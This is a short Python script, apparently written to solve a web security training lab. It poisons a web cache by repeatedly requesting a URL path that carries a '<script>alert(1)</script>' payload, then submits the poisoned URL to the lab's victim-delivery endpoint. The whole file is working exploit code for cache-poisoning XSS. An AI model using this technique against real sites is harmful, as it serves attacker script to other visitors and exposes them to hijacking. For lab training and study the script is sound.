import http.client

import requests
import http.client
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def poison_custom_page(self):
        domain = self.lab_url.replace('https://', '').rstrip('/')
        conn = http.client.HTTPSConnection(domain)
        url = '/<script>alert(1)</script>'
        conn.request('GET', url)
        print(conn.getresponse().read())
        conn.request('GET', url)
        print(conn.getresponse().read())
        conn.request('GET', url)
        print(conn.getresponse().read())
        conn.request('GET', url)
        print(conn.getresponse().read())
        conn.request('GET', url)
        print(conn.getresponse().read())

    def deliver_to_victim(self):
        data = {
            'answer': self.lab_url + '<script>alert(1)</script>'
        }
        self.session.post(self.lab_url + 'deliver-to-victim', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.poison_custom_page()
        self.deliver_to_victim()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
